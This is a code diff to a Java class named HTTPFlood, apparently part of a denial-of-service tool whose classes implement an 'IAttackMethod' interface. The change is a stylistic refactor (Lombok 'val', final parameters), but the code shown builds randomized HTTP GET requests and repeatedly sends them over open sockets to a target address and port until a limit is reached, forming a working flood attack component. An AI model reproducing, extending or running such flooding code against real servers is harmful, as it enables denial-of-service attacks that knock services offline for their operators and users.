@@ -6,6 +6,7 @@ import ir.xenoncommunity.jss.utils.Randomize;
 import ir.xenoncommunity.jss.utils.SocketUtils;
 import lombok.Cleanup;
 import lombok.RequiredArgsConstructor;
+import lombok.val;
 import org.jetbrains.annotations.NotNull;
 
 import java.io.OutputStream;
@@ -24,9 +25,9 @@ public class HTTPFlood implements IAttackMethod {
      * @param addr the InetAddress to connect to
      * @return the byte array representation of the HTTP request
      */
-    private static byte[] createHTTPRequest(@NotNull InetAddress addr) {
+    private static byte[] createHTTPRequest(final @NotNull InetAddress addr) {
         // Construct the HTTP request
-        String request = "GET /" + Randomize.randomString(8) + " HTTP/1.1\r\n" +
+        val request = "GET /" + Randomize.randomString(8) + " HTTP/1.1\r\n" +
                 "Host: " + addr.getHostAddress() + "\r\n" +
                 "Connection: keep-alive\r\n" +
                 "Cache-Control: max-age=0\r\n" +
@@ -54,12 +55,12 @@ public class HTTPFlood implements IAttackMethod {
      * @throws Exception if an error occurs during the sending process
      */
     @Override
-    public void send(InetAddress addr, int port) throws Exception {
+    public void send(final InetAddress addr, final int port) throws Exception {
         // Check if the limit is reached before sending
         if (statics.isLimitReached()) return;
 
         // create a socket connection to the specified address and port
-        @Cleanup Socket socket = new Socket(addr, port);
+        @Cleanup val socket = new Socket(addr, port);
 
         // if the socket is not connected, return
         if (!socket.isConnected()) return;
@@ -74,11 +75,11 @@ public class HTTPFlood implements IAttackMethod {
         statics.cps(); // update connection per second statistics
 
         // get the output stream from the socket
-        @Cleanup OutputStream outputStream = socket.getOutputStream();
+        @Cleanup val outputStream = socket.getOutputStream();
 
         // create an HTTP request
-        byte[] bytes = createHTTPRequest(addr);
-        int length = bytes.length;
+        val bytes = createHTTPRequest(addr);
+        val length = bytes.length;
 
         // send the request while the socket is connected and the limit is not reached
         while (socket.isConnected() && !statics.isLimitReached() && statics.isRunning()) {
